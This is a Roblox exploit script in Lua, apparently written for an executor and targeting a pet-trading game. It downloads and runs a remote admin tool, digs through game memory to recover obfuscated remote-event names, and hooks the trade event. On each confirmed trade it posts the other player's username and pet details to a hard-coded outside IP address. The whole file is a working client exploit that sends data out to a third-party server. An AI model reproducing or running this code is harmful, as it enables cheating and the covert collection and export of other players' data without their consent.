loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-- loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
local router

for i, v in next, getgc(true) do
    if type(v) == 'table' and rawget(v, 'get_remote_from_cache') then
        router = v
    end
end

local function rename(remotename, hashedremote)
    hashedremote.Name = remotename
end
-- Apply renaming to upvalues of the RouterClient.init function
table.foreach(debug.getupvalue(router.get_remote_from_cache, 1), rename)


local HttpService = game:GetService("HttpService")
local remoteEvent = game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("DataAPI/DataChanged")

remoteEvent.OnClientEvent:Connect(function(player, eventType, tradeTable)
    if eventType ~= "trade" then return end
    if type(tradeTable) == "table" then
        local senderOffer = tradeTable.sender_offer
        if senderOffer and type(senderOffer) == "table" then
            if senderOffer.confirmed then
                local jsonData = {
                    roblox_username = senderOffer.player_name or "Unknown",
                    pet_data = {}
                }

                for index, item in pairs(senderOffer.items or {}) do
                    local props = item.properties or {}

                    local prefix = "normal"
                    if props.mega_neon then
                        prefix = "mega"
                    elseif props.neon then
                        prefix = "neon"
                    end

                    local suffix = ""
                    if props.flyable and props.rideable then
                        suffix = "flyride"
                    elseif props.flyable then
                        suffix = "fly"
                    elseif props.rideable then
                        suffix = "ride"
                    end

                    local label = suffix ~= "" and (prefix .. "_" .. suffix) or prefix

                    table.insert(jsonData.pet_data, {
                        name = item.kind or "Unknown",
                        type = label
                    })
                end

                -- Convert to JSON
                local jsonBody = HttpService:JSONEncode(jsonData)

                -- Send with http_request
                local response = http_request({
                    Url = "http://47.129.34.40/api/robloxapi",
                    Method = "POST",
                    Headers = {
                        ["Accept"] = "application/json",
                        ["Content-Type"] = "application/json",
                        ["User-Agent"] = "RobloxScript"
                    },
                    Body = jsonBody
                })                

                print("[HTTP REQUEST SENT]")
                print("Status Code:", response.StatusCode)
                print("Body:", response.Body)
            end
        else
            print("No sender_offer found.")
        end
    else
        print("Trade Table is not a table:", tradeTable)
    end
end)
